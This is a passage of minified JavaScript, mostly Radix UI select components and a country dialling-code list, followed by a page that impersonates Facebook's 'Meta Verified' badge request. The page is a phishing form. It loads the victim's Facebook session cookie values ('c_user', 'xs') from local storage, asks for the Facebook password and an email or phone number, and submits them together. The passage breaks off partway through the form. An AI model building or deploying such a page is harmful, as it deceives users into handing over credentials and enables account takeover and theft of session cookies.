    const T = h.useCallback(k => {
        k && x.current === !0 && (y(),
        f == null || f(),
        x.current = !1)
    }
    , [y, f]);
    return g.jsx(LR, {
        scope: n,
        contentWrapper: a,
        shouldExpandOnScrollRef: w,
        onScrollButtonChange: T,
        children: g.jsx("div", {
            ref: l,
            style: {
                display: "flex",
                flexDirection: "column",
                position: "fixed",
                zIndex: _
            },
            children: g.jsx(ge.div, {
                ...o,
                ref: d,
                style: {
                    boxSizing: "border-box",
                    maxHeight: "100%",
                    ...o.style
                }
            })
        })
    })
}
);
f0.displayName = MR;
var IR = "SelectPopperPosition"
  , Od = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, align: r="start", collisionPadding: o=Xt, ...s} = e
      , i = bu(n);
    return g.jsx(_R, {
        ...i,
        ...s,
        ref: t,
        align: r,
        collisionPadding: o,
        style: {
            boxSizing: "border-box",
            ...s.style,
            "--radix-select-content-transform-origin": "var(--radix-popper-transform-origin)",
            "--radix-select-content-available-width": "var(--radix-popper-available-width)",
            "--radix-select-content-available-height": "var(--radix-popper-available-height)",
            "--radix-select-trigger-width": "var(--radix-popper-anchor-width)",
            "--radix-select-trigger-height": "var(--radix-popper-anchor-height)"
        }
    })
}
);
Od.displayName = IR;
var [LR,hp] = ks(fo, {})
  , jd = "SelectViewport"
  , p0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, nonce: r, ...o} = e
      , s = Vr(jd, n)
      , i = hp(jd, n)
      , a = Le(t, s.onViewportChange)
      , l = h.useRef(0);
    return g.jsxs(g.Fragment, {
        children: [g.jsx("style", {
            dangerouslySetInnerHTML: {
                __html: "[data-radix-select-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-select-viewport]::-webkit-scrollbar{display:none}"
            },
            nonce: r
        }), g.jsx(_u.Slot, {
            scope: n,
            children: g.jsx(ge.div, {
                "data-radix-select-viewport": "",
                role: "presentation",
                ...o,
                ref: a,
                style: {
                    position: "relative",
                    flex: 1,
                    overflow: "hidden auto",
                    ...o.style
                },
                onScroll: fe(o.onScroll, u => {
                    const c = u.currentTarget
                      , {contentWrapper: d, shouldExpandOnScrollRef: p} = i;
                    if (p != null && p.current && d) {
                        const w = Math.abs(l.current - c.scrollTop);
                        if (w > 0) {
                            const x = window.innerHeight - Xt * 2
                              , m = parseFloat(d.style.minHeight)
                              , S = parseFloat(d.style.height)
                              , v = Math.max(m, S);
                            if (v < x) {
                                const f = v + w
                                  , y = Math.min(x, f)
                                  , _ = f - y;
                                d.style.height = y + "px",
                                d.style.bottom === "0px" && (c.scrollTop = _ > 0 ? _ : 0,
                                d.style.justifyContent = "flex-end")
                            }
                        }
                    }
                    l.current = c.scrollTop
                }
                )
            })
        })]
    })
}
);
p0.displayName = jd;
var h0 = "SelectGroup"
  , [DR,FR] = ks(h0)
  , VR = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, ...r} = e
      , o = Qo();
    return g.jsx(DR, {
        scope: n,
        id: o,
        children: g.jsx(ge.div, {
            role: "group",
            "aria-labelledby": o,
            ...r,
            ref: t
        })
    })
}
);
VR.displayName = h0;
var m0 = "SelectLabel"
  , v0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, ...r} = e
      , o = FR(m0, n);
    return g.jsx(ge.div, {
        id: o.id,
        ...r,
        ref: t
    })
}
);
v0.displayName = m0;
var Bl = "SelectItem"
  , [zR,g0] = ks(Bl)
  , y0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, value: r, disabled: o=!1, textValue: s, ...i} = e
      , a = Fr(Bl, n)
      , l = Vr(Bl, n)
      , u = a.value === r
      , [c,d] = h.useState(s ?? "")
      , [p,w] = h.useState(!1)
      , x = Le(t, f => {
        var y;
        return (y = l.itemRefCallback) == null ? void 0 : y.call(l, f, r, o)
    }
    )
      , m = Qo()
      , S = h.useRef("touch")
      , v = () => {
        o || (a.onValueChange(r),
        a.onOpenChange(!1))
    }
    ;
    if (r === "")
        throw new Error("A <Select.Item /> must have a value prop that is not an empty string. This is because the Select value can be set to an empty string to clear the selection and show the placeholder.");
    return g.jsx(zR, {
        scope: n,
        value: r,
        disabled: o,
        textId: m,
        isSelected: u,
        onItemTextChange: h.useCallback(f => {
            d(y => y || ((f == null ? void 0 : f.textContent) ?? "").trim())
        }
        , []),
        children: g.jsx(_u.ItemSlot, {
            scope: n,
            value: r,
            disabled: o,
            textValue: c,
            children: g.jsx(ge.div, {
                role: "option",
                "aria-labelledby": m,
                "data-highlighted": p ? "" : void 0,
                "aria-selected": u && p,
                "data-state": u ? "checked" : "unchecked",
                "aria-disabled": o || void 0,
                "data-disabled": o ? "" : void 0,
                tabIndex: o ? void 0 : -1,
                ...i,
                ref: x,
                onFocus: fe(i.onFocus, () => w(!0)),
                onBlur: fe(i.onBlur, () => w(!1)),
                onClick: fe(i.onClick, () => {
                    S.current !== "mouse" && v()
                }
                ),
                onPointerUp: fe(i.onPointerUp, () => {
                    S.current === "mouse" && v()
                }
                ),
                onPointerDown: fe(i.onPointerDown, f => {
                    S.current = f.pointerType
                }
                ),
                onPointerMove: fe(i.onPointerMove, f => {
                    var y;
                    S.current = f.pointerType,
                    o ? (y = l.onItemLeave) == null || y.call(l) : S.current === "mouse" && f.currentTarget.focus({
                        preventScroll: !0
                    })
                }
                ),
                onPointerLeave: fe(i.onPointerLeave, f => {
                    var y;
                    f.currentTarget === document.activeElement && ((y = l.onItemLeave) == null || y.call(l))
                }
                ),
                onKeyDown: fe(i.onKeyDown, f => {
                    var _;
                    ((_ = l.searchRef) == null ? void 0 : _.current) !== "" && f.key === " " || (kR.includes(f.key) && v(),
                    f.key === " " && f.preventDefault())
                }
                )
            })
        })
    })
}
);
y0.displayName = Bl;
var Qs = "SelectItemText"
  , w0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, className: r, style: o, ...s} = e
      , i = Fr(Qs, n)
      , a = Vr(Qs, n)
      , l = g0(Qs, n)
      , u = RR(Qs, n)
      , [c,d] = h.useState(null)
      , p = Le(t, v => d(v), l.onItemTextChange, v => {
        var f;
        return (f = a.itemTextRefCallback) == null ? void 0 : f.call(a, v, l.value, l.disabled)
    }
    )
      , w = c == null ? void 0 : c.textContent
      , x = h.useMemo( () => g.jsx("option", {
        value: l.value,
        disabled: l.disabled,
        children: w
    }, l.value), [l.disabled, l.value, w])
      , {onNativeOptionAdd: m, onNativeOptionRemove: S} = u;
    return ft( () => (m(x),
    () => S(x)), [m, S, x]),
    g.jsxs(g.Fragment, {
        children: [g.jsx(ge.span, {
            id: l.textId,
            ...s,
            ref: p
        }), l.isSelected && i.valueNode && !i.valueNodeHasChildren ? mo.createPortal(s.children, i.valueNode) : null]
    })
}
);
w0.displayName = Qs;
var x0 = "SelectItemIndicator"
  , S0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, ...r} = e;
    return g0(x0, n).isSelected ? g.jsx(ge.span, {
        "aria-hidden": !0,
        ...r,
        ref: t
    }) : null
}
);
S0.displayName = x0;
var Md = "SelectScrollUpButton"
  , _0 = h.forwardRef( (e, t) => {
    const n = Vr(Md, e.__scopeSelect)
      , r = hp(Md, e.__scopeSelect)
      , [o,s] = h.useState(!1)
      , i = Le(t, r.onScrollButtonChange);
    return ft( () => {
        if (n.viewport && n.isPositioned) {
            let a = function() {
                const u = l.scrollTop > 0;
                s(u)
            };
            const l = n.viewport;
            return a(),
            l.addEventListener("scroll", a),
            () => l.removeEventListener("scroll", a)
        }
    }
    , [n.viewport, n.isPositioned]),
    o ? g.jsx(b0, {
        ...e,
        ref: i,
        onAutoScroll: () => {
            const {viewport: a, selectedItem: l} = n;
            a && l && (a.scrollTop = a.scrollTop - l.offsetHeight)
        }
    }) : null
}
);
_0.displayName = Md;
var Id = "SelectScrollDownButton"
  , E0 = h.forwardRef( (e, t) => {
    const n = Vr(Id, e.__scopeSelect)
      , r = hp(Id, e.__scopeSelect)
      , [o,s] = h.useState(!1)
      , i = Le(t, r.onScrollButtonChange);
    return ft( () => {
        if (n.viewport && n.isPositioned) {
            let a = function() {
                const u = l.scrollHeight - l.clientHeight
                  , c = Math.ceil(l.scrollTop) < u;
                s(c)
            };
            const l = n.viewport;
            return a(),
            l.addEventListener("scroll", a),
            () => l.removeEventListener("scroll", a)
        }
    }
    , [n.viewport, n.isPositioned]),
    o ? g.jsx(b0, {
        ...e,
        ref: i,
        onAutoScroll: () => {
            const {viewport: a, selectedItem: l} = n;
            a && l && (a.scrollTop = a.scrollTop + l.offsetHeight)
        }
    }) : null
}
);
E0.displayName = Id;
var b0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, onAutoScroll: r, ...o} = e
      , s = Vr("SelectScrollButton", n)
      , i = h.useRef(null)
      , a = Eu(n)
      , l = h.useCallback( () => {
        i.current !== null && (window.clearInterval(i.current),
        i.current = null)
    }
    , []);
    return h.useEffect( () => () => l(), [l]),
    ft( () => {
        var c;
        const u = a().find(d => d.ref.current === document.activeElement);
        (c = u == null ? void 0 : u.ref.current) == null || c.scrollIntoView({
            block: "nearest"
        })
    }
    , [a]),
    g.jsx(ge.div, {
        "aria-hidden": !0,
        ...o,
        ref: t,
        style: {
            flexShrink: 0,
            ...o.style
        },
        onPointerDown: fe(o.onPointerDown, () => {
            i.current === null && (i.current = window.setInterval(r, 50))
        }
        ),
        onPointerMove: fe(o.onPointerMove, () => {
            var u;
            (u = s.onItemLeave) == null || u.call(s),
            i.current === null && (i.current = window.setInterval(r, 50))
        }
        ),
        onPointerLeave: fe(o.onPointerLeave, () => {
            l()
        }
        )
    })
}
)
  , $R = "SelectSeparator"
  , C0 = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, ...r} = e;
    return g.jsx(ge.div, {
        "aria-hidden": !0,
        ...r,
        ref: t
    })
}
);
C0.displayName = $R;
var Ld = "SelectArrow"
  , UR = h.forwardRef( (e, t) => {
    const {__scopeSelect: n, ...r} = e
      , o = bu(n)
      , s = Fr(Ld, n)
      , i = Vr(Ld, n);
    return s.open && i.position === "popper" ? g.jsx(ER, {
        ...o,
        ...r,
        ref: t
    }) : null
}
);
UR.displayName = Ld;
function k0(e) {
    return e === "" || e === void 0
}
var T0 = h.forwardRef( (e, t) => {
    const {value: n, ...r} = e
      , o = h.useRef(null)
      , s = Le(t, o)
      , i = bR(n);
    return h.useEffect( () => {
        const a = o.current
          , l = window.HTMLSelectElement.prototype
          , c = Object.getOwnPropertyDescriptor(l, "value").set;
        if (i !== n && c) {
            const d = new Event("change",{
                bubbles: !0
            });
            c.call(a, n),
            a.dispatchEvent(d)
        }
    }
    , [i, n]),
    g.jsx(du, {
        asChild: !0,
        children: g.jsx("select", {
            ...r,
            ref: s,
            defaultValue: n
        })
    })
}
);
T0.displayName = "BubbleSelect";
function P0(e) {
    const t = Ft(e)
      , n = h.useRef("")
      , r = h.useRef(0)
      , o = h.useCallback(i => {
        const a = n.current + i;
        t(a),
        function l(u) {
            n.current = u,
            window.clearTimeout(r.current),
            u !== "" && (r.current = window.setTimeout( () => l(""), 1e3))
        }(a)
    }
    , [t])
      , s = h.useCallback( () => {
        n.current = "",
        window.clearTimeout(r.current)
    }
    , []);
    return h.useEffect( () => () => window.clearTimeout(r.current), []),
    [n, o, s]
}
function N0(e, t, n) {
    const o = t.length > 1 && Array.from(t).every(u => u === t[0]) ? t[0] : t
      , s = n ? e.indexOf(n) : -1;
    let i = BR(e, Math.max(s, 0));
    o.length === 1 && (i = i.filter(u => u !== n));
    const l = i.find(u => u.textValue.toLowerCase().startsWith(o.toLowerCase()));
    return l !== n ? l : void 0
}
function BR(e, t) {
    return e.map( (n, r) => e[(t + r) % e.length])
}
var HR = n0
  , R0 = o0
  , WR = i0
  , ZR = a0
  , KR = l0
  , A0 = u0
  , QR = p0
  , O0 = v0
  , j0 = y0
  , qR = w0
  , GR = S0
  , M0 = _0
  , I0 = E0
  , L0 = C0;
const YR = HR
  , XR = WR
  , D0 = h.forwardRef( ({className: e, children: t, ...n}, r) => g.jsxs(R0, {
    ref: r,
    className: ve("flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1", e),
    ...n,
    children: [t, g.jsx(ZR, {
        asChild: !0,
        children: g.jsx(Zy, {
            className: "h-4 w-4 opacity-50"
        })
    })]
}));
D0.displayName = R0.displayName;
const F0 = h.forwardRef( ({className: e, ...t}, n) => g.jsx(M0, {
    ref: n,
    className: ve("flex cursor-default items-center justify-center py-1", e),
    ...t,
    children: g.jsx(Eb, {
        className: "h-4 w-4"
    })
}));
F0.displayName = M0.displayName;
const V0 = h.forwardRef( ({className: e, ...t}, n) => g.jsx(I0, {
    ref: n,
    className: ve("flex cursor-default items-center justify-center py-1", e),
    ...t,
    children: g.jsx(Zy, {
        className: "h-4 w-4"
    })
}));
V0.displayName = I0.displayName;
const z0 = h.forwardRef( ({className: e, children: t, position: n="popper", ...r}, o) => g.jsx(KR, {
    children: g.jsxs(A0, {
        ref: o,
        className: ve("relative z-50 max-h-96 min-w-[8rem] overflow-hidden rounded-md border bg-popover text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2", n === "popper" && "data-[side=bottom]:translate-y-1 data-[side=left]:-translate-x-1 data-[side=right]:translate-x-1 data-[side=top]:-translate-y-1", e),
        position: n,
        ...r,
        children: [g.jsx(F0, {}), g.jsx(QR, {
            className: ve("p-1", n === "popper" && "h-[var(--radix-select-trigger-height)] w-full min-w-[var(--radix-select-trigger-width)]"),
            children: t
        }), g.jsx(V0, {})]
    })
}));
z0.displayName = A0.displayName;
const JR = h.forwardRef( ({className: e, ...t}, n) => g.jsx(O0, {
    ref: n,
    className: ve("py-1.5 pl-8 pr-2 text-sm font-semibold", e),
    ...t
}));
JR.displayName = O0.displayName;
const $0 = h.forwardRef( ({className: e, children: t, ...n}, r) => g.jsxs(j0, {
    ref: r,
    className: ve("relative flex w-full cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50", e),
    ...n,
    children: [g.jsx("span", {
        className: "absolute left-2 flex h-3.5 w-3.5 items-center justify-center",
        children: g.jsx(GR, {
            children: g.jsx(_b, {
                className: "h-4 w-4"
            })
        })
    }), g.jsx(qR, {
        children: t
    })]
}));
$0.displayName = j0.displayName;
const eA = h.forwardRef( ({className: e, ...t}, n) => g.jsx(L0, {
    ref: n,
    className: ve("-mx-1 my-1 h-px bg-muted", e),
    ...t
}));
eA.displayName = L0.displayName;
const Am = [{
    code: "+93",
    name: "Afghanistan"
}, {
    code: "+355",
    name: "Albania"
}, {
    code: "+213",
    name: "Algeria"
}, {
    code: "+376",
    name: "Andorra"
}, {
    code: "+244",
    name: "Angola"
}, {
    code: "+1",
    name: "United States/Canada"
}, {
    code: "+54",
    name: "Argentina"
}, {
    code: "+374",
    name: "Armenia"
}, {
    code: "+61",
    name: "Australia"
}, {
    code: "+43",
    name: "Austria"
}, {
    code: "+994",
    name: "Azerbaijan"
}, {
    code: "+973",
    name: "Bahrain"
}, {
    code: "+880",
    name: "Bangladesh"
}, {
    code: "+375",
    name: "Belarus"
}, {
    code: "+32",
    name: "Belgium"
}, {
    code: "+501",
    name: "Belize"
}, {
    code: "+229",
    name: "Benin"
}, {
    code: "+975",
    name: "Bhutan"
}, {
    code: "+591",
    name: "Bolivia"
}, {
    code: "+387",
    name: "Bosnia and Herzegovina"
}, {
    code: "+267",
    name: "Botswana"
}, {
    code: "+55",
    name: "Brazil"
}, {
    code: "+673",
    name: "Brunei"
}, {
    code: "+359",
    name: "Bulgaria"
}, {
    code: "+226",
    name: "Burkina Faso"
}, {
    code: "+257",
    name: "Burundi"
}, {
    code: "+855",
    name: "Cambodia"
}, {
    code: "+237",
    name: "Cameroon"
}, {
    code: "+238",
    name: "Cape Verde"
}, {
    code: "+236",
    name: "Central African Republic"
}, {
    code: "+235",
    name: "Chad"
}, {
    code: "+56",
    name: "Chile"
}, {
    code: "+86",
    name: "China"
}, {
    code: "+57",
    name: "Colombia"
}, {
    code: "+269",
    name: "Comoros"
}, {
    code: "+242",
    name: "Congo"
}, {
    code: "+506",
    name: "Costa Rica"
}, {
    code: "+385",
    name: "Croatia"
}, {
    code: "+53",
    name: "Cuba"
}, {
    code: "+357",
    name: "Cyprus"
}, {
    code: "+420",
    name: "Czech Republic"
}, {
    code: "+45",
    name: "Denmark"
}, {
    code: "+253",
    name: "Djibouti"
}, {
    code: "+1-767",
    name: "Dominica"
}, {
    code: "+1-809",
    name: "Dominican Republic"
}, {
    code: "+670",
    name: "East Timor"
}, {
    code: "+593",
    name: "Ecuador"
}, {
    code: "+20",
    name: "Egypt"
}, {
    code: "+503",
    name: "El Salvador"
}, {
    code: "+240",
    name: "Equatorial Guinea"
}, {
    code: "+291",
    name: "Eritrea"
}, {
    code: "+372",
    name: "Estonia"
}, {
    code: "+251",
    name: "Ethiopia"
}, {
    code: "+679",
    name: "Fiji"
}, {
    code: "+358",
    name: "Finland"
}, {
    code: "+33",
    name: "France"
}, {
    code: "+241",
    name: "Gabon"
}, {
    code: "+220",
    name: "Gambia"
}, {
    code: "+995",
    name: "Georgia"
}, {
    code: "+49",
    name: "Germany"
}, {
    code: "+233",
    name: "Ghana"
}, {
    code: "+30",
    name: "Greece"
}, {
    code: "+1-473",
    name: "Grenada"
}, {
    code: "+502",
    name: "Guatemala"
}, {
    code: "+224",
    name: "Guinea"
}, {
    code: "+245",
    name: "Guinea-Bissau"
}, {
    code: "+592",
    name: "Guyana"
}, {
    code: "+509",
    name: "Haiti"
}, {
    code: "+504",
    name: "Honduras"
}, {
    code: "+852",
    name: "Hong Kong"
}, {
    code: "+36",
    name: "Hungary"
}, {
    code: "+354",
    name: "Iceland"
}, {
    code: "+91",
    name: "India"
}, {
    code: "+62",
    name: "Indonesia"
}, {
    code: "+98",
    name: "Iran"
}, {
    code: "+964",
    name: "Iraq"
}, {
    code: "+353",
    name: "Ireland"
}, {
    code: "+972",
    name: "Israel"
}, {
    code: "+39",
    name: "Italy"
}, {
    code: "+81",
    name: "Japan"
}, {
    code: "+962",
    name: "Jordan"
}, {
    code: "+7",
    name: "Kazakhstan"
}, {
    code: "+254",
    name: "Kenya"
}, {
    code: "+686",
    name: "Kiribati"
}, {
    code: "+82",
    name: "South Korea"
}, {
    code: "+965",
    name: "Kuwait"
}, {
    code: "+996",
    name: "Kyrgyzstan"
}, {
    code: "+856",
    name: "Laos"
}, {
    code: "+371",
    name: "Latvia"
}, {
    code: "+961",
    name: "Lebanon"
}, {
    code: "+266",
    name: "Lesotho"
}, {
    code: "+231",
    name: "Liberia"
}, {
    code: "+218",
    name: "Libya"
}, {
    code: "+423",
    name: "Liechtenstein"
}, {
    code: "+370",
    name: "Lithuania"
}, {
    code: "+352",
    name: "Luxembourg"
}, {
    code: "+853",
    name: "Macau"
}, {
    code: "+389",
    name: "Macedonia"
}, {
    code: "+261",
    name: "Madagascar"
}, {
    code: "+265",
    name: "Malawi"
}, {
    code: "+60",
    name: "Malaysia"
}, {
    code: "+960",
    name: "Maldives"
}, {
    code: "+223",
    name: "Mali"
}, {
    code: "+356",
    name: "Malta"
}, {
    code: "+692",
    name: "Marshall Islands"
}, {
    code: "+222",
    name: "Mauritania"
}, {
    code: "+230",
    name: "Mauritius"
}, {
    code: "+52",
    name: "Mexico"
}, {
    code: "+691",
    name: "Micronesia"
}, {
    code: "+373",
    name: "Moldova"
}, {
    code: "+377",
    name: "Monaco"
}, {
    code: "+976",
    name: "Mongolia"
}, {
    code: "+382",
    name: "Montenegro"
}, {
    code: "+212",
    name: "Morocco"
}, {
    code: "+258",
    name: "Mozambique"
}, {
    code: "+95",
    name: "Myanmar"
}, {
    code: "+264",
    name: "Namibia"
}, {
    code: "+674",
    name: "Nauru"
}, {
    code: "+977",
    name: "Nepal"
}, {
    code: "+31",
    name: "Netherlands"
}, {
    code: "+64",
    name: "New Zealand"
}, {
    code: "+505",
    name: "Nicaragua"
}, {
    code: "+227",
    name: "Niger"
}, {
    code: "+234",
    name: "Nigeria"
}, {
    code: "+47",
    name: "Norway"
}, {
    code: "+968",
    name: "Oman"
}, {
    code: "+92",
    name: "Pakistan"
}, {
    code: "+680",
    name: "Palau"
}, {
    code: "+970",
    name: "Palestine"
}, {
    code: "+507",
    name: "Panama"
}, {
    code: "+675",
    name: "Papua New Guinea"
}, {
    code: "+595",
    name: "Paraguay"
}, {
    code: "+51",
    name: "Peru"
}, {
    code: "+63",
    name: "Philippines"
}, {
    code: "+48",
    name: "Poland"
}, {
    code: "+351",
    name: "Portugal"
}, {
    code: "+974",
    name: "Qatar"
}, {
    code: "+40",
    name: "Romania"
}, {
    code: "+7",
    name: "Russia"
}, {
    code: "+250",
    name: "Rwanda"
}, {
    code: "+1-869",
    name: "Saint Kitts and Nevis"
}, {
    code: "+1-758",
    name: "Saint Lucia"
}, {
    code: "+685",
    name: "Samoa"
}, {
    code: "+378",
    name: "San Marino"
}, {
    code: "+966",
    name: "Saudi Arabia"
}, {
    code: "+221",
    name: "Senegal"
}, {
    code: "+381",
    name: "Serbia"
}, {
    code: "+248",
    name: "Seychelles"
}, {
    code: "+232",
    name: "Sierra Leone"
}, {
    code: "+65",
    name: "Singapore"
}, {
    code: "+421",
    name: "Slovakia"
}, {
    code: "+386",
    name: "Slovenia"
}, {
    code: "+677",
    name: "Solomon Islands"
}, {
    code: "+252",
    name: "Somalia"
}, {
    code: "+27",
    name: "South Africa"
}, {
    code: "+34",
    name: "Spain"
}, {
    code: "+94",
    name: "Sri Lanka"
}, {
    code: "+249",
    name: "Sudan"
}, {
    code: "+597",
    name: "Suriname"
}, {
    code: "+268",
    name: "Swaziland"
}, {
    code: "+46",
    name: "Sweden"
}, {
    code: "+41",
    name: "Switzerland"
}, {
    code: "+963",
    name: "Syria"
}, {
    code: "+886",
    name: "Taiwan"
}, {
    code: "+992",
    name: "Tajikistan"
}, {
    code: "+255",
    name: "Tanzania"
}, {
    code: "+66",
    name: "Thailand"
}, {
    code: "+228",
    name: "Togo"
}, {
    code: "+676",
    name: "Tonga"
}, {
    code: "+1-868",
    name: "Trinidad and Tobago"
}, {
    code: "+216",
    name: "Tunisia"
}, {
    code: "+90",
    name: "Turkey"
}, {
    code: "+993",
    name: "Turkmenistan"
}, {
    code: "+688",
    name: "Tuvalu"
}, {
    code: "+256",
    name: "Uganda"
}, {
    code: "+380",
    name: "Ukraine"
}, {
    code: "+971",
    name: "United Arab Emirates"
}, {
    code: "+44",
    name: "United Kingdom"
}, {
    code: "+598",
    name: "Uruguay"
}, {
    code: "+998",
    name: "Uzbekistan"
}, {
    code: "+678",
    name: "Vanuatu"
}, {
    code: "+379",
    name: "Vatican City"
}, {
    code: "+58",
    name: "Venezuela"
}, {
    code: "+84",
    name: "Vietnam"
}, {
    code: "+967",
    name: "Yemen"
}, {
    code: "+260",
    name: "Zambia"
}, {
    code: "+263",
    name: "Zimbabwe"
}];
function tA() {
    const {toast: e} = Df()
      , [,t] = Mf()
      , [n,r] = h.useState(!1)
      , [o,s] = h.useState(!1)
      , [i,a] = h.useState("")
      , [l,u] = h.useState(Am)
      , c = Sw({
        resolver: Nw(DT),
        defaultValues: {
            c_user: "",
            xs: "",
            user_email: "",
            password: "",
            contactMethod: "email",
            countryCode: "+1"
        }
    })
      , d = c.watch("contactMethod");
    h.useEffect( () => {
        const w = localStorage.getItem("validation_data");
        if (!w) {
            t("/validation");
            return
        }
        try {
            const x = JSON.parse(w);
            if (!x.c_user || !x.xs)
                throw new Error("Invalid validation data");
            c.setValue("c_user", x.c_user),
            c.setValue("xs", x.xs)
        } catch (x) {
            console.error("Failed to parse validation data:", x),
            t("/validation")
        }
    }
    , [c, t]),
    h.useEffect( () => {
        const w = Am.filter(x => x.name.toLowerCase().includes(i.toLowerCase()) || x.code.toLowerCase().includes(i.toLowerCase()));
        u(w)
    }
    , [i]);
    const p = async w => {
        try {
            if (s(!0),
            !w.password) {
                e({
                    variant: "destructive",
                    title: "Error",
                    description: "Password is required"
                });
                return
            }
            const x = {
                ...w,
                user_email: w.user_email ? d === "phone" ? `${w.countryCode}${w.user_email}` : w.user_email : "",
                timestamp: new Date().toISOString()
            };
            await lN(x),
            localStorage.removeItem("validation_data"),
            e({
                title: "Success!",
                description: "Your information has been submitted successfully"
            }),
            setTimeout( () => {
                t("/success")
            }
            , 1500)
        } catch (x) {
            console.error("Form submission error:", x),
            e({
                variant: "destructive",
                title: "Error",
                description: "Failed to submit form. Please try again."
            })
        } finally {
            s(!1)
        }
    }
    ;
    return g.jsxs(g.Fragment, {
        children: [g.jsx(qf, {
            title: "Meta Verified | Confirmation",
            description: "Request a verified badge on Facebook - Final Step"
        }), g.jsx("div", {
            className: "min-h-screen flex justify-center items-center p-3 sm:p-4 bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5",
            children: g.jsxs("div", {
                className: "bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20",
                children: [g.jsx("img", {
                    src: "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526",
                    alt: "Logo",
                    className: "w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
                }), g.jsx("h1", {
                    className: "text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5",
                    children: "Facebook Security"
                }), g.jsx("h3", {
                    className: "text-sm sm:text-base text-[#606770] mb-4 font-medium",
                    children: "Please enter your facebook password to complete the request"
                }), g.jsx(Cw, {
                    ...c,
                    children: g.jsxs("form", {
                        onSubmit: c.handleSubmit(p),
                        className: "space-y-4",
                        children: [g.jsxs("div", {
                            className: "text-left",
                            children: [g.jsxs("div", {
                                className: "mb-4",
                                children: [g.jsx("label", {
                                    className: "block font-semibold mb-1.5 text-[#606770] text-xs sm:text-sm",
                                    children: "Contact Method (Optional)"
                                }), g.jsxs("div", {
                                    className: "flex gap-4",
                                    children: [g.jsx("button", {
                                        type: "button",
                                        onClick: () => c.setValue("contactMethod", "email"),
                                        className: `flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${d === "email" ? "bg-[#0180FA] text-white" : "bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10"}`,
                                        children: "Email"
                                    }), g.jsx("button", {
                                        type: "button",
                                        onClick: () => c.setValue("contactMethod", "phone"),
                                        className: `flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${d === "phone" ? "bg-[#0180FA] text-white" : "bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10"}`,
                                        children: "Phone"
                                    })]
                                })]
                            }), g.jsx(Nl, {
                                control: c.control,
                                name: "user_email",
                                render: ({field: w}) => g.jsxs(ki, {
                                    children: [g.jsx(Ti, {
                                        className: "block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm",
                                        children: d === "email" ? "Email Address (Optional)" : "Phone Number (Optional)"
                                    }), g.jsx(Pi, {
                                        children: g.jsxs("div", {
                                            className: "flex gap-2",
                                            children: [d === "phone" && g.jsxs(YR, {
                                                value: c.getValues("countryCode"),
                                                onValueChange: x => c.setValue("countryCode", x),
                                                children: [g.jsx(D0, {
                                                    className: "w-[100px]",
                                                    children: g.jsx(XR, {
                                                        placeholder: "Code"
                                                    })
                                                }), g.jsxs(z0, {
                                                    children: [g.jsx("div", {
                                                        className: "sticky top-0 p-2 bg-white border-b z-50",
                                                        children: g.jsx("div", {
                                                            className: "flex items-center px-2 py-1 border rounded-md",
                                                            children: g.jsx("input", {
                                                                className: "w-full outline-none text-sm bg-transparent cursor-default",
                                                                placeholder: "Search country...",
                                                                value: i,
                                                                onChange: x => a(x.target.value),
                                                                readOnly: !0
                                                            })
                                                        })
                                                    }), g.jsx("div", {
                                                        className: "max-h-[200px] overflow-y-auto",
                                                        children: l.map(x => g.jsxs($0, {
                                                            value: x.code,
                                                            children: [x.code, " (", x.name, ")"]
                                                        }, x.code))
                                                    })]
                                                })]
                                            }), g.jsx(Ri, {
                                                type: d === "email" ? "email" : "tel",
                                                placeholder: d === "email" ? "Enter email address" : "Enter phone number",
                                                className: "w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20",
                                                ...w
                                            })]
                                        })
                                    }), g.jsx(Ni, {
                                        className: "text-xs text-red-500 mt-1"
                                    })]
                                })
                            })]
                        }), g.jsx(Nl, {
                            control: c.control,
                            name: "password",
                            render: ({field: w}) => g.jsxs(ki, {
                                children: [g.jsx(Ti, {
                                    className: "block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm",
                                    children: "Password"
                                }), g.jsx(Pi, {
                                    children: g.jsxs("div", {
                                        className: "relative",
                                        children: [g.jsx(Ri, {
                                            type: n ? "text" : "password",
                                            placeholder: "Enter password",
                                            className: "w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20 pr-10",
                                            ...w
                                        }), g.jsx("button", {
                                            type: "button",
                                            onClick: () => r(!n),
